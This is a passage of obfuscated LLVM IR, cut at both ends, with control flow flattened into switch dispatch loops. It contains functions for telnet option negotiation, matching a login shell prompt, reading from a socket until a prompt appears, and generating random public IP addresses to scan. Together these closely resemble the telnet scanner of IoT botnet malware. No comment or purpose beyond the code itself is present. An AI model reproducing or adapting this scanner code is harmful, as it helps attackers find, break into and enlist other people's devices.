  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -86616802, i32 -992978963
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -2113958538, i32 337817518
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 864886070, i32 337817518
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -906983317, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 81573064, i32 168570176
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 -913667696, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 1833333724, i32 1389530174
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1442923658, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -1542379976, i32 -99131853
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 1915717334, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 1915717334, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1442923658, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -913667696, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -1285903027, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1332218702, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1285903027, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -906983317, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -1223478935, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1223478935, label %11
    i32 -1432576123, label %18
    i32 -299088568, label %19
    i32 -1304130912, label %24
    i32 -1147591513, label %37
    i32 -483388709, label %50
    i32 -907753031, label %63
    i32 512502434, label %75
    i32 973901029, label %76
    i32 2133856273, label %78
    i32 -727814781, label %81
    i32 -491207627, label %100
    i32 -704974934, label %101
    i32 101207759, label %102
    i32 -623033976, label %105
    i32 -1306569827, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -1432576123, i32 -623033976
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -299088568, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -1304130912, i32 973901029
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 512502434, i32 -1147591513
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 512502434, i32 -483388709
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 512502434, i32 -907753031
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 512502434, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 973901029, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 2133856273, i32 -727814781
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -299088568, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 -491207627, i32 -704974934
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1306569827, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 101207759, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -1223478935, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1306569827, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -742682141, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -742682141, label %33
    i32 390579480, label %39
    i32 313528400, label %44
    i32 1705628186, label %48
    i32 -64806910, label %49
    i32 -369284549, label %51
    i32 1756788165, label %52
    i32 1507628185, label %61
    i32 1130041766, label %78
    i32 -1640225772, label %79
    i32 -2095506367, label %91
    i32 -1401772172, label %95
    i32 -1683621001, label %96
    i32 1168944205, label %105
    i32 -1999509254, label %114
    i32 -532077391, label %118
    i32 1845834777, label %119
    i32 -1014387059, label %128
    i32 1453767490, label %129
    i32 1991082458, label %130
    i32 -1825885781, label %136
    i32 -382660918, label %140
    i32 -2126108503, label %145
    i32 234315651, label %146
    i32 -1290116024, label %147
    i32 150386516, label %148
    i32 -888113693, label %152
    i32 -2061555910, label %153
    i32 748151385, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 390579480, i32 -64806910
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 1705628186, i32 313528400
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 1705628186, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -64806910, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -369284549, i32 150386516
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 1756788165, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !4
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 1507628185, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 1130041766, i32 -1640225772
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 150386516, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -1401772172, i32 -2095506367
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -1401772172, i32 -1683621001
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 748151385, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 1168944205, i32 1991082458
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -532077391, i32 -1999509254
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -532077391, i32 1845834777
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 748151385, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 1453767490, i32 -1014387059
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 748151385, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1290116024, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 -2126108503, i32 -1825885781
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -382660918, i32 234315651
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 -2126108503, i32 234315651
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 150386516, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1290116024, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -742682141, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 -888113693, i32 -2061555910
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 748151385, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 748151385, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4 = zext i8 %3 to i32
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1456734983, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1456734983, label %first
    i32 -1792197021, label %7
    i32 218532973, label %22
    i32 -756180227, label %27
    i32 1376446128, label %42
    i32 -1466409108, label %47
    i32 -1876462193, label %72
    i32 1581907085, label %75
    i32 646895312, label %80
    i32 -1614993122, label %85
    i32 -1081800974, label %90
    i32 79631351, label %95
    i32 1899702105, label %100
    i32 1203423548, label %105
    i32 -1688884236, label %110
    i32 1305361358, label %115
    i32 -266389307, label %120
    i32 1495143898, label %125
    i32 1170149495, label %130
    i32 -1445303903, label %135
    i32 -928330343, label %140
    i32 -1882707960, label %145
    i32 -1721446460, label %150
    i32 1754073162, label %155
    i32 -1486036743, label %160
    i32 -594821545, label %165
    i32 -22954804, label %170
    i32 1878383839, label %175
    i32 -124806350, label %180
    i32 1173599422, label %185
    i32 -1272911974, label %190
    i32 -2017911883, label %195
    i32 -1356239581, label %200
    i32 -901666666, label %205
    i32 -415630367, label %210
    i32 2066791573, label %215
    i32 -1030644261, label %220
    i32 -627769396, label %225
    i32 -1026459111, label %230
    i32 776138563, label %235
    i32 -1180283845, label %239
    i32 596402706, label %240
    i32 108523526, label %242
    i32 -2138130344, label %255
    i32 849343447, label %268
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sge i32 %.reload, 255
  %6 = select i1 %5, i32 -1792197021, i32 218532973
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %9 = add i8 %8, 1
  store i8 %9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %10 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %11 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %12 = zext i8 %11 to i32
  %13 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %16 = zext i8 %15 to i32
  %17 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %18 = zext i8 %17 to i32
  %19 = call i32 (i8*, i8*, ...) @szprintf(i8* %10, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %12, i32 %14, i32 %16, i32 %18)
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = call i32 @inet_addr(i8* %20) #2
  store i32 %21, i32* %1, align 4
  store i32 849343447, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp sge i32 %24, 255
  %26 = select i1 %25, i32 -756180227, i32 1376446128
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %29 = add i8 %28, 1
  store i8 %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %38 = zext i8 %37 to i32
  %39 = call i32 (i8*, i8*, ...) @szprintf(i8* %30, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %32, i32 %34, i32 %36, i32 %38)
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %41 = call i32 @inet_addr(i8* %40) #2
  store i32 %41, i32* %1, align 4
  store i32 849343447, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp sge i32 %44, 255
  %46 = select i1 %45, i32 -1466409108, i32 -1876462193
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @rand() #2
  %49 = srem i32 %48, 255
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %51 = call i32 @rand() #2
  %52 = srem i32 %51, 255
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %54 = call i32 @rand() #2
  %55 = srem i32 %54, 255
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %57 = call i32 @rand() #2
  %58 = srem i32 %57, 255
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %60 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %62 = zext i8 %61 to i32
  %63 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %64 = zext i8 %63 to i32
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %68 = zext i8 %67 to i32
